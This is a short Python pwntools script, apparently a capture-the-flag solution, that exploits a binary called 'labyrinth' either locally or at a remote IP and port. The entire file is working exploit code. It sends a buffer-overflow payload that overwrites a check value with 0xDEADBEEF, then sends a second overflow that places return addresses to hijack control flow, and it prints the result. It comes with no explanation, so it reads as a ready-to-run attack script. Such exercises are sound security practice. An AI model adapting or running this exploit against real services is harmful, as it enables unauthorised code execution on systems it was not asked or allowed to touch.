#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = "warning"

if len(sys.argv) > 1 and sys.argv[1] == "LOCAL":
    r = process("./labyrinth")
else:
    r = remote("172.105.60.118", 10002)

r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"New Bio:")
r.sendline(b"A" * 64 + p32(0xDEADBEEF) + b"B" * 8 + p32(1))
r.recvuntil(b">")

r.sendline(b"2")
r.recvuntil(b"Chant > ")
r.send(b"A" * 32 + b"B" * 8 + p64(0x40101A) + p64(0x4011B6))

output = r.recvall(timeout=3)
print(output.decode("latin-1"))
r.close()
